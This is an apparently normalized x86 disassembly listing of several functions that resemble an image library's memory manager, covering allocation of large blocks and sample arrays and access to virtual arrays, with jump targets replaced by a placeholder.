sub_41faa0
push ebp
mov ebp esp
sub esp 0x4c
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
mov [ ebp - 0x4 ] ecx
cmp [ ebp + 0x10 ] 0x3b9ac9f0
jbe r-xdata
mov eax [ ebp + 0x10 ]
xor edx edx
mov ecx 0x8
div ecx
mov [ ebp - 0xc ] edx
cmp [ ebp - 0xc ] 0x0
jbe r-xdata
push 0x3
mov edx [ ebp + 0x8 ]
push edx
call sub_41fa60
add esp 0x8
cmp [ ebp + 0xc ] 0x0
jl r-xdata
mov edx 0x8
sub edx [ ebp - 0xc ]
mov eax [ ebp + 0x10 ]
add eax edx
mov [ ebp + 0x10 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0x14 ] 0xe
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ebp + 0xc ]
mov [ ecx + 0x18 ] edx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
call [ edx ]
add esp 0x4
cmp [ ebp + 0xc ] 0x2
jl r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x4c ]
mov edx [ ebp + 0x10 ]
lea eax [ ecx + edx + 0x10 ]
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x4c ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x4 ]
mov eax [ ecx + eax * 4 + 0x3c ]
mov [ edx ] eax
mov ecx [ ebp - 0x8 ]
mov edx [ ebp + 0x10 ]
mov [ ecx + 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov [ eax + 0x8 ] 0x0
mov ecx [ ebp + 0xc ]
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov [ edx + ecx * 4 + 0x3c ] eax
mov eax [ ebp - 0x8 ]
add eax 0x10
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x4
mov edx [ ebp + 0x8 ]
push edx
call sub_41fa60
add esp 0x8
mov eax [ ebp + 0x10 ]
add eax 0x10
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_42b2b0
add esp 0x8
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
sub_41fba0
push ebp
mov ebp esp
sub esp 0x60
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
mov [ ebp - 0x4 ] ecx
mov eax 0x3b9ac9f0
xor edx edx
div [ ebp + 0x10 ]
mov [ ebp - 0x1c ] eax
cmp [ ebp - 0x1c ] 0x0
jg r-xdata
mov ecx [ ebp - 0x1c ]
cmp ecx [ ebp + 0x14 ]
jge r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x14 ] 0x46
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
call [ eax ]
add esp 0x4
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x10 ] eax
mov edx [ ebp - 0x1c ]
mov [ ebp - 0x10 ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0x14 ]
sub ecx [ ebp - 0x14 ]
cmp [ ebp - 0x10 ] ecx
jae r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
mov [ ecx + 0x50 ] edx
mov eax [ ebp + 0x14 ]
shl eax 0x2
push eax
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_41f890
add esp 0xc
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x14 ] 0x0
mov eax [ ebp + 0x14 ]
sub eax [ ebp - 0x14 ]
mov [ ebp - 0x20 ] eax
mov edx [ ebp - 0x10 ]
mov [ ebp - 0x20 ] edx
jmp r-xdata
cmp [ ebp - 0x18 ] 0x0
jbe r-xdata
mov ecx [ ebp - 0x20 ]
mov [ ebp - 0x10 ] ecx
mov edx [ ebp - 0x10 ]
imul edx [ ebp + 0x10 ]
push edx
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_41faa0
add esp 0xc
mov [ ebp - 0xc ] eax
mov edx [ ebp - 0x10 ]
mov [ ebp - 0x18 ] edx
jmp r-xdata
jmp r-xdata
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
mov [ edx + ecx * 4 ] eax
mov ecx [ ebp - 0x14 ]
add ecx 0x1
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0xc ]
add edx [ ebp + 0x10 ]
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp + 0x14 ]
jae r-xdata
mov eax [ ebp - 0x18 ]
sub eax 0x1
mov [ ebp - 0x18 ] eax
sub_41fcb0
push ebp
mov ebp esp
sub esp 0x60
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp + 0x10 ]
shl ecx 0x7
mov eax 0x3b9ac9f0
xor edx edx
div ecx
mov [ ebp - 0x1c ] eax
cmp [ ebp - 0x1c ] 0x0
jg r-xdata
mov ecx [ ebp - 0x1c ]
cmp ecx [ ebp + 0x14 ]
jge r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x14 ] 0x46
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
call [ eax ]
add esp 0x4
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x10 ] eax
mov edx [ ebp - 0x1c ]
mov [ ebp - 0x10 ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0x14 ]
sub ecx [ ebp - 0x14 ]
cmp [ ebp - 0x10 ] ecx
jae r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
mov [ ecx + 0x50 ] edx
mov eax [ ebp + 0x14 ]
shl eax 0x2
push eax
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_41f890
add esp 0xc
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x14 ] 0x0
mov eax [ ebp + 0x14 ]
sub eax [ ebp - 0x14 ]
mov [ ebp - 0x20 ] eax
mov edx [ ebp - 0x10 ]
mov [ ebp - 0x20 ] edx
jmp r-xdata
cmp [ ebp - 0x18 ] 0x0
jbe r-xdata
mov ecx [ ebp - 0x20 ]
mov [ ebp - 0x10 ] ecx
mov edx [ ebp - 0x10 ]
imul edx [ ebp + 0x10 ]
shl edx 0x7
push edx
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_41faa0
add esp 0xc
mov [ ebp - 0xc ] eax
mov edx [ ebp - 0x10 ]
mov [ ebp - 0x18 ] edx
jmp r-xdata
jmp r-xdata
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
mov [ edx + ecx * 4 ] eax
mov ecx [ ebp - 0x14 ]
add ecx 0x1
mov [ ebp - 0x14 ] ecx
mov edx [ ebp + 0x10 ]
shl edx 0x7
mov eax [ ebp - 0xc ]
add eax edx
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp + 0x14 ]
jae r-xdata
mov eax [ ebp - 0x18 ]
sub eax 0x1
mov [ ebp - 0x18 ] eax
sub_41fdd0
push ebp
mov ebp esp
sub esp 0x48
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
mov [ ebp - 0x4 ] ecx
cmp [ ebp + 0xc ] 0x1
je r-xdata
push 0x78
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_41f890
add esp 0xc
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x0
mov ecx [ ebp - 0x8 ]
mov edx [ ebp + 0x18 ]
mov [ ecx + 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0x14 ]
mov [ eax + 0x8 ] ecx
mov edx [ ebp - 0x8 ]
mov eax [ ebp + 0x1c ]
mov [ edx + 0xc ] eax
mov ecx [ ebp - 0x8 ]
mov dl [ ebp + 0x10 ]
mov [ ecx + 0x20 ] dl
mov eax [ ebp - 0x8 ]
mov [ eax + 0x22 ] 0x0
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x44 ]
mov [ ecx + 0x24 ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ ecx + 0x44 ] edx
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x14 ] 0xe
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov eax [ ebp + 0xc ]
mov [ edx + 0x18 ] eax
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
call [ eax ]
add esp 0x4
sub_41fe80
push ebp
mov ebp esp
sub esp 0x48
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
mov [ ebp - 0x4 ] ecx
cmp [ ebp + 0xc ] 0x1
je r-xdata
push 0x78
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_41f890
add esp 0xc
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x0
mov ecx [ ebp - 0x8 ]
mov edx [ ebp + 0x18 ]
mov [ ecx + 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0x14 ]
mov [ eax + 0x8 ] ecx
mov edx [ ebp - 0x8 ]
mov eax [ ebp + 0x1c ]
mov [ edx + 0xc ] eax
mov ecx [ ebp - 0x8 ]
mov dl [ ebp + 0x10 ]
mov [ ecx + 0x20 ] dl
mov eax [ ebp - 0x8 ]
mov [ eax + 0x22 ] 0x0
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x48 ]
mov [ ecx + 0x24 ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ ecx + 0x48 ] edx
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x14 ] 0xe
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov eax [ ebp + 0xc ]
mov [ edx + 0x18 ] eax
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
call [ eax ]
add esp 0x4
sub_41ff30
push ebp
mov ebp esp
sub esp 0x60
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] 0x0
mov [ ebp - 0xc ] 0x0
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x44 ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x48 ]
mov [ ebp - 0x20 ] ecx
jmp r-xdata
mov eax [ ebp - 0x1c ]
cmp [ eax ] 0x0
jne r-xdata
cmp [ ebp - 0x20 ] 0x0
je r-xdata
jmp r-xdata
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x1c ]
mov eax [ ecx + 0xc ]
imul eax [ edx + 0x8 ]
mov ecx [ ebp - 0x8 ]
add ecx eax
mov [ ebp - 0x8 ] ecx
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x1c ]
mov ecx [ edx + 0x4 ]
imul ecx [ eax + 0x8 ]
mov edx [ ebp - 0xc ]
add edx ecx
mov [ ebp - 0xc ] edx
cmp [ ebp - 0x8 ] 0x0
jg r-xdata
mov ecx [ ebp - 0x20 ]
cmp [ ecx ] 0x0
jne r-xdata
mov ecx [ ebp - 0x1c ]
mov edx [ ecx + 0x24 ]
mov [ ebp - 0x1c ] edx
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x4c ]
push edx
mov eax [ ebp - 0xc ]
push eax
mov ecx [ ebp - 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_42b2f0
add esp 0x10
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0xc ]
jl r-xdata
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x20 ]
mov ecx [ edx + 0xc ]
imul ecx [ eax + 0x8 ]
shl ecx 0x7
mov edx [ ebp - 0x8 ]
add edx ecx
mov [ ebp - 0x8 ] edx
mov eax [ ebp - 0x20 ]
mov ecx [ ebp - 0x20 ]
mov edx [ eax + 0x4 ]
imul edx [ ecx + 0x8 ]
shl edx 0x7
mov eax [ ebp - 0xc ]
add eax edx
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x10 ]
cdq
idiv [ ebp - 0x8 ]
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
jg r-xdata
mov [ ebp - 0x18 ] 0x3b9aca00
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x20 ]
mov eax [ edx + 0x24 ]
mov [ ebp - 0x20 ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x44 ]
mov [ ebp - 0x1c ] edx
jmp r-xdata
mov [ ebp - 0x18 ] 0x1
cmp [ ebp - 0x1c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x48 ]
mov [ ebp - 0x20 ] ecx
jmp r-xdata
mov edx [ ebp - 0x1c ]
cmp [ edx ] 0x0
jne r-xdata
cmp [ ebp - 0x20 ] 0x0
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x1c ]
mov eax [ eax + 0x4 ]
sub eax 0x1
mov ecx [ ebp - 0x1c ]
xor edx edx
div [ ecx + 0xc ]
add eax 0x1
mov [ ebp - 0x14 ] eax
mov edx [ ebp - 0x14 ]
cmp edx [ ebp - 0x18 ]
jg r-xdata
mov ecx [ ebp - 0x20 ]
cmp [ ecx ] 0x0
jne r-xdata
mov eax [ ebp - 0x1c ]
mov ecx [ eax + 0x24 ]
mov [ ebp - 0x1c ] ecx
mov eax [ ebp - 0x1c ]
mov ecx [ ebp - 0x18 ]
imul ecx [ eax + 0xc ]
mov edx [ ebp - 0x1c ]
mov [ edx + 0x10 ] ecx
mov eax [ ebp - 0x1c ]
mov ecx [ ebp - 0x1c ]
mov edx [ eax + 0x4 ]
imul edx [ ecx + 0x8 ]
push edx
mov eax [ ebp - 0x1c ]
add eax 0x28
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_42b310
add esp 0xc
mov edx [ ebp - 0x1c ]
mov [ edx + 0x22 ] 0x1
mov eax [ ebp - 0x1c ]
mov ecx [ ebp - 0x1c ]
mov edx [ ecx + 0x4 ]
mov [ eax + 0x10 ] edx
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0x20 ]
mov eax [ edx + 0x4 ]
sub eax 0x1
mov ecx [ ebp - 0x20 ]
xor edx edx
div [ ecx + 0xc ]
add eax 0x1
mov [ ebp - 0x14 ] eax
mov edx [ ebp - 0x14 ]
cmp edx [ ebp - 0x18 ]
jg r-xdata
mov eax [ ebp - 0x1c ]
mov ecx [ eax + 0x10 ]
push ecx
mov edx [ ebp - 0x1c ]
mov eax [ edx + 0x8 ]
push eax
push 0x1
mov ecx [ ebp + 0x8 ]
push ecx
call sub_41fba0
add esp 0x10
mov edx [ ebp - 0x1c ]
mov [ edx ] eax
mov eax [ ebp - 0x1c ]
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x50 ]
mov [ eax + 0x14 ] edx
mov eax [ ebp - 0x1c ]
mov [ eax + 0x18 ] 0x0
mov ecx [ ebp - 0x1c ]
mov [ ecx + 0x1c ] 0x0
mov edx [ ebp - 0x1c ]
mov [ edx + 0x21 ] 0x0
mov edx [ ebp - 0x20 ]
mov eax [ edx + 0x24 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x20 ]
mov ecx [ ebp - 0x18 ]
imul ecx [ eax + 0xc ]
mov edx [ ebp - 0x20 ]
mov [ edx + 0x10 ] ecx
mov eax [ ebp - 0x20 ]
mov ecx [ ebp - 0x20 ]
mov edx [ eax + 0x4 ]
imul edx [ ecx + 0x8 ]
shl edx 0x7
push edx
mov eax [ ebp - 0x20 ]
add eax 0x28
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_42b310
add esp 0xc
mov edx [ ebp - 0x20 ]
mov [ edx + 0x22 ] 0x1
mov eax [ ebp - 0x20 ]
mov ecx [ ebp - 0x20 ]
mov edx [ ecx + 0x4 ]
mov [ eax + 0x10 ] edx
jmp r-xdata
mov eax [ ebp - 0x20 ]
mov ecx [ eax + 0x10 ]
push ecx
mov edx [ ebp - 0x20 ]
mov eax [ edx + 0x8 ]
push eax
push 0x1
mov ecx [ ebp + 0x8 ]
push ecx
call sub_41fcb0
add esp 0x10
mov edx [ ebp - 0x20 ]
mov [ edx ] eax
mov eax [ ebp - 0x20 ]
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x50 ]
mov [ eax + 0x14 ] edx
mov eax [ ebp - 0x20 ]
mov [ eax + 0x18 ] 0x0
mov ecx [ ebp - 0x20 ]
mov [ ecx + 0x1c ] 0x0
mov edx [ ebp - 0x20 ]
mov [ edx + 0x21 ] 0x0
sub_420210
push ebp
mov ebp esp
sub esp 0x50
push ebx
push esi
push edi
mov eax [ ebp + 0x10 ]
add eax [ ebp + 0x14 ]
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0xc ]
mov edx [ ebp - 0x4 ]
cmp edx [ ecx + 0x4 ]
ja r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x14 ] 0x16
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
call [ ecx ]
add esp 0x4
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x14 ]
cmp ecx [ eax + 0xc ]
ja r-xdata
mov ecx [ ebp + 0xc ]
xor edx edx
mov dl [ ecx + 0x22 ]
test edx edx
jne r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ecx + 0x18 ]
mov eax [ ebp + 0xc ]
add edx [ eax + 0x10 ]
cmp [ ebp - 0x4 ] edx
jbe r-xdata
mov edx [ ebp + 0xc ]
cmp [ edx ] 0x0
jne r-xdata
mov edx [ ebp + 0xc ]
xor eax eax
mov al [ edx + 0x21 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x14 ] 0x45
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
call [ ecx ]
add esp 0x4
mov edx [ ebp + 0xc ]
mov eax [ edx + 0x1c ]
cmp eax [ ebp - 0x4 ]
jae r-xdata
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x10 ]
cmp eax [ edx + 0x18 ]
jb r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x10 ]
cmp edx [ ecx + 0x18 ]
jbe r-xdata
push 0x1
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_420420
add esp 0xc
mov eax [ ebp + 0xc ]
mov [ eax + 0x21 ] 0x0
mov eax [ ebp + 0x18 ]
and eax 0xff
test eax eax
je r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ecx + 0x1c ]
cmp edx [ ebp + 0x10 ]
jae r-xdata
mov edx [ ebp + 0xc ]
mov eax [ ebp - 0x4 ]
sub eax [ edx + 0x10 ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jge r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x18 ] ecx
jmp r-xdata
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x10 ]
sub eax [ edx + 0x18 ]
mov ecx [ ebp + 0xc ]
mov edx [ ecx ]
lea eax [ edx + eax * 4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0xc ]
mov [ ecx + 0x21 ] 0x1
mov ecx [ ebp + 0xc ]
mov edx [ ecx + 0x1c ]
mov [ ebp - 0x8 ] edx
mov eax [ ebp + 0x18 ]
and eax 0xff
test eax eax
je r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ebp - 0xc ]
mov [ ecx + 0x18 ] edx
mov [ ebp - 0xc ] 0x0
push 0x0
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_420420
add esp 0xc
mov eax [ ebp + 0xc ]
xor ecx ecx
mov cl [ eax + 0x20 ]
test ecx ecx
je r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ebp - 0x4 ]
mov [ ecx + 0x1c ] edx
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0x14 ] 0x16
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
call [ edx ]
add esp 0x4
mov eax [ ebp + 0x18 ]
and eax 0xff
test eax eax
jne r-xdata
mov edx [ ebp + 0xc ]
mov eax [ edx + 0x8 ]
mov [ ebp - 0x10 ] eax
mov ecx [ ebp + 0xc ]
mov edx [ ebp - 0x8 ]
sub edx [ ecx + 0x18 ]
mov [ ebp - 0x8 ] edx
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x4 ]
sub ecx [ eax + 0x18 ]
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x18 ]
and eax 0xff
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0x14 ] 0x16
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
call [ edx ]
add esp 0x4
jmp r-xdata
mov eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp + 0xc ]
mov edx [ ecx ]
mov eax [ ebp - 0x8 ]
mov ecx [ edx + eax * 4 ]
push ecx
call sub_420d70
add esp 0x8
mov edx [ ebp - 0x8 ]
add edx 0x1
mov [ ebp - 0x8 ] edx
jmp r-xdata
mov edx [ ebp - 0x8 ]
cmp edx [ ebp - 0x4 ]
jae r-xdata
sub_420420
push ebp
mov ebp esp
sub esp 0x64
push ebx
push esi
push edi
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x8 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp + 0xc ]
mov eax [ edx + 0x18 ]
imul eax [ ebp - 0x4 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x18 ] 0x0
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x18 ]
cmp ecx [ eax + 0x10 ]
jge r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0xc ]
mov eax [ edx + 0x10 ]
sub eax [ ebp - 0x18 ]
mov ecx [ ebp + 0xc ]
cmp [ ecx + 0x14 ] eax
jge r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ecx + 0x10 ]
sub edx [ ebp - 0x18 ]
mov [ ebp - 0x1c ] edx
mov edx [ ebp + 0xc ]
mov eax [ edx + 0x14 ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x1c ]
sub ecx [ ebp - 0x14 ]
mov [ ebp - 0x20 ] ecx
mov edx [ ebp - 0x10 ]
mov [ ebp - 0x20 ] edx
jmp r-xdata
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov ecx [ ebp + 0xc ]
mov edx [ ecx + 0x18 ]
add edx [ ebp - 0x18 ]
mov [ ebp - 0x14 ] edx
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x1c ]
sub ecx [ ebp - 0x14 ]
cmp [ ebp - 0x10 ] ecx
jge r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x4 ]
sub ecx [ ebp - 0x14 ]
mov [ ebp - 0x24 ] ecx
mov edx [ ebp - 0x10 ]
mov [ ebp - 0x24 ] edx
jmp r-xdata
mov edx [ ebp - 0x20 ]
mov [ ebp - 0x10 ] edx
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x4 ]
sub ecx [ ebp - 0x14 ]
cmp [ ebp - 0x10 ] ecx
jge r-xdata
mov eax [ ebp - 0x10 ]
imul eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov ecx [ ebp + 0x10 ]
and ecx 0xff
test ecx ecx
je r-xdata
jmp r-xdata
mov edx [ ebp - 0x24 ]
mov [ ebp - 0x10 ] edx
cmp [ ebp - 0x10 ] 0x0
jg r-xdata
mov edx [ ebp - 0xc ]
push edx
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp + 0xc ]
mov edx [ ecx ]
mov eax [ ebp - 0x18 ]
mov ecx [ edx + eax * 4 ]
push ecx
mov edx [ ebp + 0xc ]
add edx 0x28
push edx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0xc ]
call [ ecx + 0x28 ]
add esp 0x14
mov edx [ ebp - 0xc ]
push edx
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp + 0xc ]
mov edx [ ecx ]
mov eax [ ebp - 0x18 ]
mov ecx [ edx + eax * 4 ]
push ecx
mov edx [ ebp + 0xc ]
add edx 0x28
push edx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0xc ]
call [ ecx + 0x2c ]
add esp 0x14
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ebp - 0x18 ]
add edx [ ecx + 0x14 ]
mov [ ebp - 0x18 ] edx
mov edx [ ebp - 0x8 ]
add edx [ ebp - 0xc ]
mov [ ebp - 0x8 ] edx
jmp r-xdata
sub_420580
push ebp
mov ebp esp
sub esp 0x50
push ebx
push esi
push edi
mov eax [ ebp + 0x10 ]
add eax [ ebp + 0x14 ]
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0xc ]
mov edx [ ebp - 0x4 ]
cmp edx [ ecx + 0x4 ]
ja r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x14 ] 0x16
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
call [ ecx ]
add esp 0x4
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x14 ]
cmp ecx [ eax + 0xc ]
ja r-xdata
mov ecx [ ebp + 0xc ]
xor edx edx
mov dl [ ecx + 0x22 ]
test edx edx
jne r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ecx + 0x18 ]
mov eax [ ebp + 0xc ]
add edx [ eax + 0x10 ]
cmp [ ebp - 0x4 ] edx
jbe r-xdata
mov edx [ ebp + 0xc ]
cmp [ edx ] 0x0
jne r-xdata
mov edx [ ebp + 0xc ]
xor eax eax
mov al [ edx + 0x21 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x14 ] 0x45
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
call [ ecx ]
add esp 0x4
mov edx [ ebp + 0xc ]
mov eax [ edx + 0x1c ]
cmp eax [ ebp - 0x4 ]
jae r-xdata
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x10 ]
cmp eax [ edx + 0x18 ]
jb r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x10 ]
cmp edx [ ecx + 0x18 ]
jbe r-xdata
push 0x1
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_4207a0
add esp 0xc
mov eax [ ebp + 0xc ]
mov [ eax + 0x21 ] 0x0
mov eax [ ebp + 0x18 ]
and eax 0xff
test eax eax
je r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ecx + 0x1c ]
cmp edx [ ebp + 0x10 ]
jae r-xdata
mov edx [ ebp + 0xc ]
mov eax [ ebp - 0x4 ]
sub eax [ edx + 0x10 ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jge r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x18 ] ecx
jmp r-xdata
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x10 ]
sub eax [ edx + 0x18 ]
mov ecx [ ebp + 0xc ]
mov edx [ ecx ]
lea eax [ edx + eax * 4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0xc ]
mov [ ecx + 0x21 ] 0x1
mov ecx [ ebp + 0xc ]
mov edx [ ecx + 0x1c ]
mov [ ebp - 0x8 ] edx
mov eax [ ebp + 0x18 ]
and eax 0xff
test eax eax
je r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ebp - 0xc ]
